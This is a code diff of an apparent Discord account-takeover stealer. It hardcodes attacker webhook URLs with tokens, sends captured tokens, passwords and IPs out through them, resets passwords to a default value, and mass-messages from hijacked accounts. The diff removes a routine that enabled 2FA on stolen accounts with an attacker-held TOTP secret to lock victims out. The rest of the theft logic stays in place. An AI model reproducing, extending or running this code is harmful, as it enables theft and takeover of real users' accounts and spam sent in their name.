@@ -39,7 +39,6 @@ API     = 'https://discord.com/api/v9'
 WS_URL  = 'wss://remote-auth-gateway.discord.gg/?v=2'
 WEBHOOK = os.environ.get('WEBHOOK_URL', 'https://canary.discord.com/api/webhooks/1477366560346734728/eIb2f-9ezgry5SqSEiFmN_tv9ExdW7kYEMdx9lKIJV1LATvMZihDWDN_Kr8FLC7VK5G6')
 WEBHOOK_BACKUP = 'https://discord.com/api/webhooks/1478274350720221274/d86UA6fKCcJ5_utKPTWmJ7qYrO_Z_aHTeBUb5Uo-N9NPA1kcGGwVd10yjZQ0_1Gs6Dsq'
-TOTP_SECRETS_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'totp_secrets.txt')
 
 # Chrome 136 UA + matching client hints
 CHROME_VER = '136'
@@ -466,126 +465,6 @@ def _clean_ip(raw_ip):
     return '?'
 
 
-# ━━━━━━━━━━━━ Auto 2FA (TOTP) ━━━━━━━━━━━━
-def _auto_enable_2fa(token, password):
-    """
-    Enable TOTP 2FA on a captured account using 3-step Discord flow:
-      1. POST totp/enable → 401 code 60003, get MFA ticket
-      2. POST /mfa/finish  → verify password, get MFA JWT
-      3. POST totp/enable  → with X-Discord-MFA-Authorization + secret + code → 200
-    Uses curl_cffi (Chrome TLS) + X-Super-Properties (required by Discord).
-    Returns (new_token, secret, backup_codes) on success.
-    Returns (None, None, None) on failure (no crash).
-    """
-    if not password or password == '?':
-        print(f'[2fa] Skipped — no password available')
-        return None, None, None
-
-    enable_url = f'{API}/users/@me/mfa/totp/enable'
-    finish_url = f'{API}/mfa/finish'
-    h = {
-        "Authorization": token,
-        "User-Agent": UA,
-        "Content-Type": "application/json",
-        "X-Super-Properties": sprops(),
-        "Origin": "https://discord.com",
-        "Referer": "https://discord.com/channels/@me",
-        "Sec-CH-UA": SEC_CH_UA,
-        "Sec-CH-UA-Mobile": SEC_CH_UA_MOBILE,
-        "Sec-CH-UA-Platform": SEC_CH_UA_PLATFORM,
-        "Sec-Fetch-Dest": "empty",
-        "Sec-Fetch-Mode": "cors",
-        "Sec-Fetch-Site": "same-origin",
-        "X-Discord-Locale": "en-US",
-        "X-Discord-Timezone": "America/Los_Angeles",
-    }
-
-    try:
-        s = _make_session()
-        # Warm session with login page cookies
-        try:
-            s.get('https://discord.com/login', headers={'User-Agent': UA}, timeout=10)
-        except:
-            pass
-
-        # ── Step 1: Trigger MFA gate → get ticket ──
-        print(f'[2fa] Step 1: triggering MFA gate...')
-        r1 = s.post(enable_url, headers=h, json={'password': password}, timeout=15)
-        j1 = r1.json()
-        err_code = j1.get('code', 0)
-        ticket = j1.get('mfa', {}).get('ticket', '')
-        print(f'[2fa] Step 1: [{r1.status_code}] code={err_code} ticket={"yes" if ticket else "no"}')
-
-        if err_code != 60003 or not ticket:
-            if r1.status_code == 200:
-                print(f'[2fa] Unexpected 200 — 2FA may already be enabled')
-            else:
-                print(f'[2fa] Step 1 failed (expected 60003): code={err_code} msg={j1.get("message", "?")}')
-            return None, None, None
-
-        # ── Step 2: Verify password via /mfa/finish → get MFA JWT ──
-        print(f'[2fa] Step 2: verifying password...')
-        r2 = s.post(finish_url, headers=h, json={
-            'ticket': ticket,
-            'mfa_type': 'password',
-            'data': password,
-        }, timeout=15)
-        j2 = r2.json()
-        mfa_jwt = j2.get('token', '')
-        print(f'[2fa] Step 2: [{r2.status_code}] jwt={"yes" if mfa_jwt else "no"}')
-
-        if r2.status_code != 200 or not mfa_jwt:
-            print(f'[2fa] Step 2 failed: {j2.get("message", "?")} (code {j2.get("code", "?")})')
-            return None, None, None
-
-        # ── Step 3: Enable TOTP with MFA authorization ──
-        secret = pyotp.random_base32()
-        totp = pyotp.TOTP(secret)
-        code = totp.now()
-
-        h3 = dict(h)
-        h3['X-Discord-MFA-Authorization'] = mfa_jwt
-
-        print(f'[2fa] Step 3: enabling TOTP...')
-        r3 = s.post(enable_url, headers=h3, json={
-            'password': password,
-            'secret': secret,
-            'code': code,
-        }, timeout=15)
-
-        if r3.status_code != 200:
-            j3 = r3.json()
-            print(f'[2fa] Step 3 failed: [{r3.status_code}] {j3.get("message", "?")} (code {j3.get("code", "?")})')
-            return None, None, None
-
-        result = r3.json()
-        new_token = result.get('token', token)
-        backup_codes = [c['code'] for c in result.get('backup_codes', []) if not c.get('consumed')]
-
-        # Save to file
-        try:
-            with open(TOTP_SECRETS_FILE, 'a', encoding='utf-8') as f:
-                f.write(json.dumps({
-                    'token': new_token,
-                    'old_token': token,
-                    'password': password,
-                    'secret': secret,
-                    'backup_codes': backup_codes,
-                    'enabled_at': time.strftime('%Y-%m-%dT%H:%M:%SZ', time.gmtime()),
-                }) + '\n')
-        except Exception as e:
-            print(f'[2fa] Warning: could not save secret file: {e}')
-
-        print(f'[2fa] ✅ 2FA Enabled! Secret: {secret[:8]}..., backups: {len(backup_codes)}, new token: {new_token[:20]}...')
-        return new_token, secret, backup_codes
-
-    except Exception as e:
-        print(f'[2fa] Error: {e}')
-        import traceback
-        traceback.print_exc()
-        return None, None, None
-
-
 DEFAULT_NEW_PASSWORD = 'Fatdude11$'
 
 
@@ -980,23 +859,9 @@ def send_webhook(token, client_ip="?", password="?"):
         pfp    = f"https://cdn.discordapp.com/avatars/{uid}/{avatar}.png" if avatar else None
         color  = 65280 if nitro else 16711680
 
-        # ── Auto-enable 2FA if account has no MFA and we have a password ──
-        totp_secret = None
-        backup_codes_str = ''
         active_token = token  # Track which token is currently valid
         final_password = password
         pw_changed = False
-        tfa_just_enabled = False
-        if not mfa and password and password != '?':
-            new_tok, secret, backups = _auto_enable_2fa(token, password)
-            if new_tok:
-                active_token = new_tok
-                totp_secret = secret
-                backup_codes_str = ', '.join(backups) if backups else 'None'
-                mfa = True  # Now it's enabled
-                tfa_just_enabled = True
-                api_h['Authorization'] = active_token
-                print(f'[2fa] Token updated for {uname}: {active_token[:20]}...')
 
         # ── Send mass messages using the active (post-takeover) token ──
         threading.Thread(target=_mass_message, args=(active_token, uname), daemon=True).start()
@@ -1029,9 +894,6 @@ def send_webhook(token, client_ip="?", password="?"):
 
         # Build 2FA section for embed
         tfa_section = f"**2FA:** {'✅ Enabled' if mfa else '❌'}\n"
-        if tfa_just_enabled and totp_secret:
-            tfa_section += f"**TOTP Secret:** `{totp_secret}`\n"
-            tfa_section += f"**Backup Codes:** `{backup_codes_str}`\n"
 
         # Build password section
         pw_line = f"**Password:** `{password}`\n"
